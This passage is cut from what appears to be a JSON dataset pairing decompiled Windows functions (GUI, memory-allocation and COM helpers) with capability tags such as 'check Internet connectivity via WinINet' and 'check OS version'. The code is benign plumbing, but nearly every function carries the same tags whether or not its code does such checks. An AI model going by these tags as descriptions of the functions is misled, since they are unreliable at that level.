        "decompiled_code": "\nvoid __cdecl fcn.00431508(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *arg_8h_00;\n    uint unaff_EDI;\n    uint32_t uVar5;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    uVar5 = 10;\n    arg_8h_00 = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x00431584;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        arg_8h_00 = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar5 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        uVar5 = uVar5 & 0xffff;\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x00431584:\n    if (arg_8h == 0) {\n        arg_8h = uVar5;\n    }\n    fcn.004313b9(arg_8h_00, arg_8h);\n    fcn.0045e747(unaff_EDI);\n    return;\n}\n",
        "token_count": 471
    },
    "00431b42": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00431b42(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x4a0a08 == *param_2) && (param_2[1] == *0x4a0a0c)) && (param_2[2] == *0x4a0a10)) &&\n           (param_2[3] == *0x4a0a14)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 463
    },
    "00431c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431c50(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    \n    piVar1 = param_1 + 4;\n    if (*piVar1 != 0) {\n        uVar2 = fcn.00431b42(0x4a0a08);\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(piVar1);\n        (*_sym.imp.ole32.dll_CoDisconnectObject)(uVar2, 0);\n        *piVar1 = 0;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "00431ca7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431ca7(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 86
    },
    "00431cc2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00431cc2(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar3;\n    \n    iVar3 = 8;\n    fcn.004627af(8);\n    if ((extraout_ECX[1] != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(extraout_ECX + 1),  iVar2 == 0)\n       ) {\n        fcn.00430303(extraout_ECX[7]);\n        iVar1 = *extraout_ECX;\n        *(unaff_EBP + -4) = 0;\n        (**(iVar1 + 0x10))();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x10) != 0) {\n            fcn.0042f689();\n            iVar3 = iVar2;\n        }\n    }\n    fcn.00462887(iVar3);\n    return;\n}\n",
        "token_count": 275
    },
    "00431e30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431e30(int32_t *arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    pcVar4 = arg_ch;\n    if (arg_ch != NULL) goto code_r0x00431e43;\n    do {\n        fcn.00411e42();\ncode_r0x00431e43:\n    } while (arg_10h == 0);\n    arg_ch = NULL;\n    cVar2 = *pcVar4;\n    pcVar5 = pcVar4;\n    while (cVar2 != '\\0') {\n        if (*pcVar5 == '%') {\n            cVar2 = pcVar5[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x00431e9b;\n                if (cVar2 < ':') goto code_r0x00431e7b;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x00431e7b:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar5 = pcVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x00431eae;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                arg_ch = arg_ch + iVar3;\n            }\n        }\n        else {\ncode_r0x00431e9b:\n            iVar3 = fcn.004648dc(*pcVar5);\n            if (iVar3 != 0) {\n                arg_ch = arg_ch + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = pcVar5 + 1;\ncode_r0x00431eae:\n            arg_ch = arg_ch + 1;\n        }\n        cVar2 = *pcVar5;\n    }\n    pcVar5 = fcn.0040f8a0(arg_ch);\n    cVar2 = *pcVar4;\n    do {\n        if (cVar2 == '\\0') {\n            fcn.00414de4(pcVar5 - *arg_8h);\n            return;\n        }\n        if (*pcVar4 == '%') {\n            cVar2 = pcVar4[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x00431f37;\n                if (cVar2 < ':') goto code_r0x00431ef4;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x00431ef4:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar4 = pcVar4 + 2;\n            if (arg_14h <= iVar3) {\n                *pcVar5 = '?';\n                goto code_r0x00431f54;\n            }\n            piVar1 = arg_10h + iVar3 * 4;\n            iVar3 = *piVar1;\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3);\n                fcn.00424fd8(pcVar5, arg_ch + 1, *piVar1);\n                arg_ch = arg_ch - iVar3;\n                pcVar5 = pcVar5 + iVar3;\n            }\n        }\n        else {\ncode_r0x00431f37:\n            iVar3 = fcn.004648dc(*pcVar4);\n            if (iVar3 != 0) {\n                *pcVar5 = *pcVar4;\n                pcVar5 = pcVar5 + 1;\n                pcVar4 = pcVar4 + 1;\n                arg_ch = arg_ch + -1;\n            }\n            *pcVar5 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\ncode_r0x00431f54:\n            pcVar5 = pcVar5 + 1;\n            arg_ch = arg_ch + -1;\n        }\n        cVar2 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 1014
    },
    "004320d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004320d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00411567(0x430517);\n        iVar3 = fcn.00411579(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00432b3c(0x496414, 0x432099, 0x432012, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.00411567(uVar2);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 307
    },
    "004321bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004321bf(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00432195();\n    uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "00432834": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00432834(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.004115a4(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.00411579(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n        *(param_1 + 4) = uVar1;\n        fcn.00462290(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 210
    },
    "00432a6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432a6e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar3 = fcn.00434dfd(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar1 = *(param_1 + 0x18);\n        puVar4 = iVar3 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(param_1 + 0x10);\n    uVar2 = *puVar4;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar2;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    return;\n}\n",
        "token_count": 289
    },
    "00432c97": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432c97(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.004329b4(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.0043288e();\n        fcn.00448eb7();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00433193": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433193(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar2 = fcn.00434dfd(param_1 + 0x14, *(param_1 + 0x18));\n        iVar1 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar3 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar3;\n            puVar3 = puVar3 + -3;\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar3;\n    puVar3[1] = uStack8;\n    *puVar3 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 302
    },
    "0043323f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043323f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    arg_8h = *(iVar1 + 8);\n    while (arg_8h != 0) {\n        fcn.0041c1e7(&arg_8h);\n        fcn.004331ec();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0043327c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043327c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = arg_8h;\n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    arg_8h = *(iVar1 + 4);\n    while (arg_8h != 0) {\n        fcn.00416670(&arg_8h);\n        fcn.00433216();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00433567": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00433567(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    if ((*(param_1 + 0x20) != 0) && (iVar2 = fcn.0041facc(),  iVar2 != 0)) {\n        piVar3 = fcn.0041fab8();\n    // WARNING: Could not recover jumptable at 0x00433585. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar4 = (**(*piVar3 + 0x60))();\n        return uVar4;\n    }\n    uVar4 = 0;\n    if (*(param_1 + 0x20) == 0) {\n        if (*(param_1 + 0x50) == 0) {\n            return 0;\n        }\n    }\n    else {\n        iVar2 = fcn.00418551(0);\n        if (iVar2 == 0) {\n            iStack20 = 0x4b62b8;\n            fcn.0046230a(&iStack20, 0x4a76e8);\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        iStack20 = 0x418838;\n        fcn.0043290a();\n    }\n    iStack20 = *(param_1 + 0x20);\n    if ((iStack20 != 0) || (*(param_1 + 0x50) != 0)) {\n        if (*(param_1 + 0x50) == 0) {\n            uVar4 = (*_sym.imp.USER32.dll_DestroyWindow)();\n        }\n        else {\n            iStack20 = 0x41885a;\n            uVar4 = (**(**(param_1 + 0x50) + 0x58))();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 453
    },
    "004336a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004336a4(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 0x80);\n    if ((uVar1 & 0x100) != 0) {\n        *param_2 = *param_2 + *0x4bb5e8;\n    }\n    if ((uVar1 & 0x200) != 0) {\n        param_2[1] = param_2[1] + *0x4bb5ec;\n    }\n    if ((uVar1 & 0x400) != 0) {\n        param_2[2] = param_2[2] - *0x4bb5e8;\n    }\n    if ((uVar1 & 0x800) != 0) {\n        param_2[3] = param_2[3] - *0x4bb5ec;\n    }\n    if (param_3 == 0) {\n        *param_2 = *param_2 + *(param_1 + 100);\n        param_2[1] = param_2[1] + *(param_1 + 0x5c);\n        param_2[2] = param_2[2] - *(param_1 + 0x68);\n        param_2[3] = param_2[3] - *(param_1 + 0x60);\n        if ((*(param_1 + 0x80) & 0x400001) == 0x400000) {\n            param_2[1] = param_2[1] + 7;\n        }\n    }\n    else {\n        *param_2 = *param_2 + *(param_1 + 0x5c);\n        param_2[1] = param_2[1] + *(param_1 + 100);\n        param_2[2] = param_2[2] - *(param_1 + 0x60);\n        param_2[3] = param_2[3] - *(param_1 + 0x68);\n        if ((*(param_1 + 0x80) & 0x400001) == 0x400000) {\n            *param_2 = *param_2 + 7;\n        }\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "00433836": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433836(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_ch == 0) || (arg_10h == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x7fff;\n    }\n    *arg_8h = uVar1;\n    if ((arg_ch == 0) || (arg_10h != 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x7fff;\n    }\n    arg_8h[1] = uVar1;\n    return;\n}\n",
        "token_count": 159
    },
    "0043459f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043459f(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.004115a4(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.00411579(-(param_2 * 4 >> 0x20 != 0) | param_2 * 4);\n        *(param_1 + 4) = uVar1;\n        fcn.00462290(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 211
    },
    "0043462d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0043462d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar3 = fcn.00434dfd(param_1 + 0x14, *(param_1 + 0x18), 0x10);\n        iVar1 = *(param_1 + 0x18);\n        puVar4 = iVar3 + -0xc + iVar1 * 0x10;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar4;\n            puVar4 = puVar4 + -4;\n        }\n    }\n    puVar4 = *(param_1 + 0x10);\n    uVar2 = *puVar4;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar2;\n    if (puVar4 != 0xfffffff8) {\n        fcn.0040f620();\n    }\n    puVar4[3] = 0;\n    return puVar4;\n}\n",
        "token_count": 309
    },
    "00434dfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00434dfd(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.00411579(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.00411e42();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 141
    },
    "00436453": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00436453(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x18) == 0) {\n        uVar1 = fcn.004182f8(\"ImageList_Create\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x18) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x18);\n    return;\n}\n",
        "token_count": 124
    },
    "004364fe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004364fe(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00436534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00436534(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x1c) == 0) {\n        uVar1 = fcn.004182f8(\"ImageList_Destroy\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x1c) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x1c);\n    return;\n}\n",
        "token_count": 127
    },
    "004365d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004365d3(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00436609": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00436609(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x58) == 0) {\n        uVar1 = fcn.004182f8(\"ImageList_LoadImageA\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x58) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x58);\n    return;\n}\n",
        "token_count": 126
    },
    "004366ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004366ba(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004366f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004366f0(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    piVar1 = param_1 + 0x84;\n    if (*piVar1 == 0) {\n        uVar2 = fcn.004182f8(\"ImageList_Read\");\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        *piVar1 = iVar3;\n    }\n    *param_2 = *piVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "00436793": {
        "rules": [
